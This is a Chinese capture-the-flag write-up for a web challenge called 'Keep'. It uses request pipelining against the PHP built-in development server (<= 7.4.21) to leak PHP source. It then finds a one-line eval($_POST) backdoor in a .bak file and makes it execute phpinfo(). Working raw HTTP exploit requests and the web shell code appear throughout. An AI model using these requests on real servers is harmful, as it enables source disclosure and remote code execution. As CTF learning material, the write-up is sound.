> 关联：[[index|CTF wp]]、[[../index|安全学习]]

# Keep
进来就单纯一个hello world
dirsearch也没扫出来什么，抓包看一下
响应包：
```http
HTTP/1.1 200 OK
Host: 101.245.72.127:8888
Date: Mon, 26 Jan 2026 07:06:14 +0000
Connection: close
X-Powered-By: PHP/7.3.4
Content-type: text/html; charset=UTF-8

Hello World!

```

这里响应再结合访问不存在文件时的报错页面，推测是`php -S`起的临时服务器
这里找到一个`PHP Development Server <= 7.4.21 - 远程源码泄露`的漏洞
https://projectdiscovery.io/blog/php-http-server-source-disclosure
可以把php文件作为静态文件输出，而不会执行，这样就能看到源码了。
直接用文章的poc。（要稍微修改一下）
```http
GET / HTTP/1.1\r\n
Host: 101.245.72.127:8888\r\n
\r\n
\r\n
GET /nihao.ph HTTP/1.1\r\n
\r\n

```
这里把\r\n标记出来了，实际就表示换行符
下面的文件只要不是`php/PHP后缀`文件就好了
返回
```http
HTTP/1.1 200 OK
Host: 101.245.72.127:8888
Date: Mon, 26 Jan 2026 07:21:07 +0000
Connection: close
Content-Length: 92

<?php
@error_reporting(~E_ALL);

echo "Hello World!" . PHP_EOL;

// s3Cr37_f1L3.php.bak
```
访问`s3Cr37_f1L3.php.bak`。响应：

```http
HTTP/1.1 200 OK
Host: 101.245.72.127:8888
Date: Mon, 26 Jan 2026 07:27:34 +0000
Connection: close
Content-Length: 32

<?php

@eval($_POST["admin"]);
```
这里就是一个简单的php后门，都是它是php.bak文件，并不是php文件，相当于上面的过程要反过来了，把静态文件作为php执行了。

那我们就反过来，上面访问bak文件，下面需要满足`php/PHP后缀`
```http
GET /s3Cr37_f1L3.php.bak HTTP/1.1
Host: 101.245.72.127:8888


POST /s3Cr37_f1L3.php HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

admin=phpinfo();
```
注意下面的`Content-Length: 16`要正确
![[file-20260126154100503.png]]
